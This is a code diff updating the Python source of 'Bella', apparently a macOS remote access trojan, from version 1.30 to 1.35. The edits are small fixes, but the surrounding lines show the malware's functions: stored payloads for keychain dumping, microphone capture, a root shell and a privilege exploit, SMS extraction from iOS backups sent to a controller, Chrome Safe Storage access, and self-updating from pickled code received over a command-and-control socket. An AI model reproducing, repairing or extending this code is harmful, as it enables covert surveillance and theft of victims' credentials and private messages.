@@ -139,7 +139,11 @@ def host_update(updated_server):
 	with open(__file__, 'wb') as content:
 		content.write(updated_server)
 	send_msg('%sUpdated [%s] with new server code.\n' % (blue_star, __file__), False)
-	#inject_payloads("'1'\n'2'\n'3'\n'4'\n'5'\n'6'\n'7'\n'8'\n")
+	#working on way to make this backwards compatible
+	#if not inject_payloads(payloads):
+	#	send_msg('%sError reinstalling payloads.\n' % red_minus, False)
+	#else:
+	#	send_msg('%sReinstalled payloads.\n' % yellow_star, False)
 	send_msg('%sRestarting server!\n' % (yellow_star), False)
 	send_msg(os.kill(bellaPID, 9), False)
 	return
@@ -196,12 +200,13 @@ def inject_payloads(payload_encoded):
 	c = conn.cursor()
 	try:
 		(vncFile, kcFile, mcFile, rsFile, insomniaFile, lockFile, chainbreakerFile, machRace) = payload_encoded.splitlines()
+		#c.execute("DELETE FROM payloads WHERE id = 1") #wipe out old payloads
 		c.execute("INSERT INTO payloads (id, vnc, keychaindump, microphone, root_shell, insomnia, lock_icon, chainbreaker, mach_race) VALUES (1, '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s')" % (vncFile.encode('base64'), kcFile.encode('base64'), mcFile.encode('base64'), rsFile.encode('base64'), insomniaFile.encode('base64'), lockFile.encode('base64'), chainbreakerFile.encode('base64'), machRace.encode('base64')))
 		conn.commit()
 		conn.close()
 		return True
 	except Exception as e:
-		print repr(e)
+		send_msg(repr(e), False)
 		conn.close()
 		return False
 
@@ -993,9 +998,11 @@ def initialize_socket():
 
 	output = check_output('ps -p %s -o etime=' % bellaPID)
 	if output[0]:
-		basicInfo += output[1]
+		basicInfo += output[1] #stick version number onto the uptime
 	else:
 		return check_output("echo 'bareNeccesities'; scutil --get LocalHostName; whoami; pwd")[1]
+
+	basicInfo += bella_version
 
 	updateDB(time.strftime("%a, %b %e %Y at %I:%M:%S %p"), 'lastLogin')
 	return basicInfo
@@ -1031,7 +1038,7 @@ def iTunes_bk_sms_extract():
 	if len(backup_paths) < 1:
 		send_msg("%sNo SMS backup files found!\n%sAre there iOS backups? Try running 'check_backups'.\n" % (red_minus, yellow_star), False)
 		return
-	send_msg("%sFound the following SMS files:\n\t%s\n" % (blue_star, '\n\t'.join([x.split('/')[-2] for x in backup_paths])), False)
+	send_msg("%sFound the following SMS files:\n\t%s\n" % (blue_star, '\n\t'.join([x.split('/')[7] for x in backup_paths])), False)
 	send_msg("%sProcessing...\n" % blue_star, False)
 	extracted = []
 	copy_path = tempfile.mkdtemp()
@@ -1047,7 +1054,8 @@ def iTunes_bk_sms_extract():
 			chat_cursor = conn.cursor()
 			try:
 				chat_cursor.execute("SELECT ROWID as chat_id, chat_identifier FROM chat")
-			except OperationalError: #encrypted database or corrupted.
+			except sqlite3.DatabaseError: #encrypted database or corrupted.
+				send_msg('%s%s is encrypted. Skipping.\n' % (red_minus, backup.split('/')[7]) , False)
 				continue
 			for chat_id, chat_identifier in chat_cursor.fetchall():
 				sender = str(chat_identifier)
@@ -1084,7 +1092,7 @@ def iTunes_bk_sms_extract():
 	shutil.rmtree(copy_path)
 	serial = [] #fast, custom bella serialization
 	for x in extracted:
-		send_msg("%sFound SMS data for %s [%s]\n" % (blue_star, x[2], byte_convert(len(json))), False)
+		send_msg("%sFound SMS data for %s [%s]\n" % (blue_star, x[2], byte_convert(len(x[1]))), False)
 		serial.append('FFA82F16'.join((x[2], x[1], x[0]))) #name, json data, username
 	send_msg("%sSending data over.\n" % yellow_star, False)
 	send_msg("FFA82F16", False)
@@ -2137,7 +2145,8 @@ def bella(*Emma):
 					send_msg(screenShot(), True)
 				elif data.startswith("host_update"):
 					send_msg("%sAttempting to update server!\n" % yellow_star, False)
-					send_msg(host_update(pickle.loads(data[11:])), True)
+					server_code = pickle.loads(data[11:])
+					send_msg(host_update(server_code), True)
 				elif data == "chrome_safe_storage":
 					chrome_safe_storage()
 				elif data == "check_backups":
@@ -2497,7 +2506,7 @@ payload_list = []
 temp_file_list = []
 host = '127.0.0.1' #Command and Control IP (listener will run on)
 port = 4545 #What port Bella will operate over
-bella_version = '1.30'
+bella_version = '1.35'
 
 #### End global variables ####
 if __name__ == '__main__':
